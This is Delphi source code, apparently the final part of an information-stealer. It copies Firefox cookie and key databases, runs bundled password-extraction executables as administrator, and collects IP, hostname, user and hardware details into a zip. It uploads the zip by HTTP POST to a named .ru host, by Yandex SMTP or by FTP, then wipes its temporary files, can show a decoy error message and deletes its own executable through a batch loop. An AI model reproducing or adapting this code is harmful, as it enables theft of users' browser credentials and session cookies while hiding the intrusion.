    if (sr.Attr and faDirectory) <> 0 then  // ���� ��������� ���� - �����
      begin
      if (sr.Name <> '.') and (sr.Name <> '..') then  // ������������ ��������� �����
        begin
        // ���-�� ������ � ���������, ����������� � sr.Name

          if FileExists(appdata + 'Mozilla\Firefox\Profiles\'+sr.Name+'\cookies.sqlite') = True then
          begin
            if DirectoryExists(GetTempWindows  + getHWID + '\Files\Browsers\Cookies\Mozila\'+sr.Name) = False then
            begin
               ForceDirectories(GetTempWindows + '\' +  getHWID + '\Files\Browsers\Cookies\Mozila\'+sr.Name);
            end;
            CopyFile(PChar(appdata + 'Mozilla\Firefox\Profiles\'+sr.Name+'\cookies.sqlite'), PChar(GetTempWindows  + getHWID + '\Files\Browsers\Cookies\Mozila\'+sr.Name+'\cookies.sqlite'), false);
          end;

          if FileExists(appdata + 'Mozilla\Firefox\Profiles\'+sr.Name+'\key4.db') = True then
          begin
            if DirectoryExists(GetTempWindows  + getHWID + '\Files\Browsers\Cookies\Mozila\'+sr.Name) = False then
            begin
               ForceDirectories(GetTempWindows + '\' +  getHWID + '\Files\Browsers\Cookies\Mozila\'+sr.Name);
            end;
            CopyFile(PChar(appdata + 'Mozilla\Firefox\Profiles\'+sr.Name+'\key4.db'), PChar(GetTempWindows  + getHWID + '\Files\Browsers\Cookies\Mozila\'+sr.Name+'\key4.db'), false);
          end;
        end;
      end;
    until FindNext(sr) <> 0;
  end;
FindClose(sr);

end;

  ///////



  RunAsAdministrator(ExtractFilePath(Application.ExeName)+'cps.exe');

  Application.ProcessMessages;
  Sleep(4000);
  Application.ProcessMessages;


  get_pass_chr();
  rebuild_pass('1');


  try
  ShellExecute(0, PChar(string('open')), PChar(string('cmd.exe')),PChar(string('/c taskkill /IM cps.exe /F')), nil, SW_HIDE);
  except
  Application.ProcessMessages;
  end;

  try
  Clipboard.SetTextBuf(PChar('1'));
  except
  Application.ProcessMessages;
  end;

  RunAsAdministrator(ExtractFilePath(Application.ExeName)+'wb.exe');

  Application.ProcessMessages;
  Sleep(4000);
  Application.ProcessMessages;


  get_pass_wb();
  rebuild_pass_wb('1');


  try
  ShellExecute(0, PChar(string('open')), PChar(string('cmd.exe')),PChar(string('/c taskkill /IM wb.exe /F')), nil, SW_HIDE);
  except
  Application.ProcessMessages;
  end;

  try
  Clipboard.SetTextBuf(PChar('1'));
  except
  Application.ProcessMessages;
  end;


  SL1.Clear;
  try
  arr := Get_Info_IP;
  SL1.Add(arr[0]);
  SL1.Add(arr[1]);
  SL1.Add(arr[2]);
  SL1.Add(arr[3]);
  SL1.Add(arr[4]);
  SL1.Add(arr[5]);
  except
     Application.ProcessMessages;
  end;


  try
  SL1.Add('NAME PC: '+Get_Computer_Net_Name);
  SL1.Add('USER NAME: '+Get_User_Name);
  SL1.Add('MAC PC: '+Physically_Mac_Address);
  SL1.Add('CPU NAME: '+string(CpuData.GenericCPU.Name));
  SL1.Add('VIDEO DEVICE: '+Get_Video_Device);
  SL1.Add('MOTHERBOARD: '+Get_Name_Motherboard);
  except
     Application.ProcessMessages;
  end;
  SL1.SaveToFile(GetTempWindows + '\' + getHWID + '\Files\InfoPC\Info.txt');




  //���������
  ZF := TZipFile.Create;
  ZF.UTF8Support := true;
  ZF.ZipDirectoryContents(GetTempWindows + '\' + getHWID + '\' + getHWID + '.zip', GetTempWindows + '\' + getHWID + '\Files\');
  ZF.Close;
  ZF.Free;
  RemoveAll(GetTempWindows + '\' + getHWID + '\Files');

 //��������

   if serversendst = 'm' then
   begin
    idhttp := TIdHTTP.Create(nil);
    formData := TIdMultipartFormDataStream.Create;
    formData.AddFile('files', GetTempWindows + '\' + getHWID + '\' + getHWID + '.zip', 'multipart/form-data');
    FormData.AddFormField('mail_to', string(emailtost));
    FormData.AddFormField('mail_subject', 'New Subject');
    FormData.AddFormField('mail_msg', arr[0]+'_'+arr[1]);
    try
    response := IdHTTP.Post('http://unayt.ru/sendst.php', formData);
    finally
    idhttp.Free;
    formData.Free;
    end;
   end
   else if serversendst = 'y' then
   begin
    SMTP := TIdSMTP.Create(Application);
    SMTP.Host := 'smtp.yandex.ru';
    SMTP.Port := 465;
    SMTP.AuthType := satDefault;
    SMTP.Username := string(emailfromst); //������ ��������� � msg.From.Address
    SMTP.Password := string(passwordfromst);

    //��� ���������� ������������ ��� SSL
    SSLOpen := TIdSSLIOHandlerSocketOpenSSL.Create(nil);
    SSLOpen.Destination := SMTP.Host+':'+IntToStr(SMTP.Port);
    SSLOpen.Host := SMTP.Host;
    SSLOpen.Port := SMTP.Port;
    SSLOpen.DefaultPort := 0;
    SSLOpen.SSLOptions.Method := sslvSSLv23;
    SSLOpen.SSLOptions.Mode := sslmUnassigned;

    SMTP.IOHandler := SSLOpen;
    SMTP.UseTLS := utUseImplicitTLS;

    msg := TIdMessage.Create(Application);
    msg.CharSet := 'Windows-1251';
    msg.Body.Text:='����� ������������';
    msg.Subject := '�������� ���������';
    msg.From.Address := string(emailfromst); //&lt;&lt;������ ��������� � SMTP.UserName
    msg.From.Name := 'Anonymous';
    msg.Recipients.EMailAddresses :=string(emailtost);
    msg.IsEncoded:=True;
    TIdAttachmentFile.Create(msg.MessageParts, GetTempWindows + '\' + getHWID + '\' + getHWID + '.zip');

    SMTP.Connect;
    if SMTP.Connected then
    begin
    SMTP.Send(msg);
    SMTP.Disconnect();
    SMTP.Free;
    msg.Free;
    //ShowMessage ('��������� ����������');
    end
    else
    begin
    //ShowMessage ('�� ������� ��������� ���������');
    SMTP.Disconnect();
    SMTP.Free;
    msg.Free;
    end;
   end
   else if serversendst = 'f' then
   begin
      idFTP := TidFTP.Create(nil);

      idFTP.host := emailfromst; // ���������� ����
      idFTP.username := passwordfromst; //��� ������������
      idFTP.password := emailtost; ///������
      idFTP.Port := 21; ///����

      IdFTP.TransferType:=ftBinary;
      idFTP.Connect; //������������

      if idFTP.Connected then // ���� ���������� �����
      begin
      try
      idFTP.Put(GetTempWindows + '\' + getHWID + '\' + getHWID + '.zip', getHWID + '.zip', true); /// ���������� ���� �� ������
      except
       Application.ProcessMessages;
      end;
      end;

      if Assigned(idFtp) then
      begin
      idFtp.Disconnect;
      idFtp.Free;
      end;
   end;
  //����� ���������



  DeleteFile(GetTempWindows + '\wb.exe');
  DeleteFile(GetTempWindows + '\cps.exe');
  DeleteFile(GetTempWindows + '\libeay32.dll');
  DeleteFile(GetTempWindows + '\ssleay32.dll');


  try
  ShellExecute(0, PChar(string('open')), PChar(string('cmd.exe')),PChar(string('/c rd /s /q '+GetTempWindows + '\' + getHWID)), nil, SW_HIDE);
  except
  Application.ProcessMessages;
  end;


 if messboolst = 'y' then
 begin
   try
    if messtypest = 'error' then
    begin
      MessageDlg(messsendst,mtError, [mbOK], 0);
    end;

    if messtypest = 'warning' then
    begin
      MessageDlg(messsendst,mtWarning, [mbOK], 0);
    end;

    if messtypest = 'confirmation' then
    begin
      MessageDlg(messsendst,mtConfirmation, [mbOK], 0);
    end;

    if messtypest = 'information' then
    begin
      MessageDlg(messsendst,mtInformation, [mbOK], 0);
    end;
  except
   Application.ProcessMessages;
  end;
 end;

  FreeAndNil(SL1);
  FreeAndNil(SL2);


  //������������
  eFile := PChar(ExtractFileName(Application.ExeName));
  AnsiToOem(PAnsiChar(eFile), PAnsiChar(eFile));
  try
  AssignFile(F,GetTempWindows + '\del.cmd');
  Rewrite(F);
  Writeln(F,':Repeat');
  Writeln(F,'del "'+eFile+'"');
  Writeln(F,'if exist "'+eFile+'" goto Repeat');
  Writeln(F,'del del.cmd');
  Flush(F);
  finally
  CloseFile(F);
  end;

  try
  ShellExecute(0, nil, PChar(GetTempWindows + '\del.cmd'), nil, PChar(ExtractFilePath(GetTempWindows + '\del.cmd')), 0);
  except
  Application.ProcessMessages;
  end;


//�������� ���������
  asm
    call Exitprocess;
  end;


end.
